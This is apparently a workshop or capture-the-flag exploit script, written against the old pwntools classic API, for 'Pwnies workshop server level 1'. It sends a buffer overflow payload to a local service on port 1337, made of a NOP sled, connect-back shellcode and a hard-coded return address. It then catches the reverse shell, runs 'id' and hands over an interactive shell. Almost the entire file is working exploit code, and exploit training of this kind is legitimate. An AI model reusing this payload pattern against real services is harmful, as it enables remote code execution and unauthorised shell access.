#!/usr/bin/env python

# Pwnies workshop server level 1

from pwn.classic import *
import re

log.waitfor('Counting to ten')
for n in range(10):
    log.status(str(n))
    sleep(0.05)
log.succeeded()

sock = remote('localhost', 1337, timeout = 1)
sock.recvuntil('Your output to my input? Do your best!\n')

handler = handler(timeout = 1)

eip = 0x0804a080
sock.send(flat(nop_pad(0xd4, connectback(sock.lhost, handler.port), avoid = '\x00\r\n'), eip, '\n'))
sock.close()

handler.wait_for_connection()
handler.interactive()

log.warning("I'm on a horse")

# demonstrate that we can switch back and forth between programmed and
# interactive mode

handler.sendline('id')
line = handler.recvline()
user = re.findall('uid=[0-9]+\(([^)]+)\)', line)[0]

log.info('Hello, %s' % user)

handler.interactive()
